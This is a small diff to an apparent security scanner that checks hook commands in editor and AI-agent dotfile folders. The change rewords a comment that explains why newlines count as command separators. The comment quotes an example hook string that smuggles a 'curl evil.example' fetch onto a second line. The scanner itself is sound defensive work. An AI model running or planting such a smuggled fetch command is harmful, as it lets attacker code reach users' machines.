@@ -28,8 +28,8 @@ _DOTFILE_DIRS = r"\.(?:claude|vscode|cursor|codex|github|windsurf)"
 
 # What separates one command from the next. A newline is a separator every
 # shell honours, and hook commands arrive as JSON strings where a multi-line
-# script is ordinary — `"echo ok\ncurl evil.example"` runs the fetch. Leaving
-# it out meant only the first line of such a hook was ever scanned.
+# script is ordinary — `"echo ok\ncurl evil.example"` runs the fetch, so
+# omitting it would leave everything past the first line unscanned.
 _CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\|)"
 
 _SCRIPT_FROM_DOTFILES_RE = re.compile(
